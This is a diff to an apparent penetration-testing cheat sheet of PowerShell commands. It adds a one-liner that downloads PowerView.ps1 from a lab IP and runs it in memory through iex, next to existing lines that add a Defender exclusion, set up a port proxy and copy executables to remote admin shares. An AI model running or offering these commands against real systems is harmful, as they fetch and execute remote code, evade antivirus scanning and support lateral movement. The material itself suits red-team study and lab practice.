@@ -179,10 +179,12 @@ Add-MpPreference -ExclusionPath "path"
 #### Add redirect in network config for specific port/ip
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
 ```
-#### File Copy
+#### File Copy or Reflectively load script/PE
 ```powershell
 Copy-Item .\script.ps1 \\<servername>\c$\'Program Files'
 echo F | xcopy path \\hostt\C$\Users\Public\file.exe
+###Invoke-Expression
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
 ```
 #### Check if AppLocker configured
 ```powershell
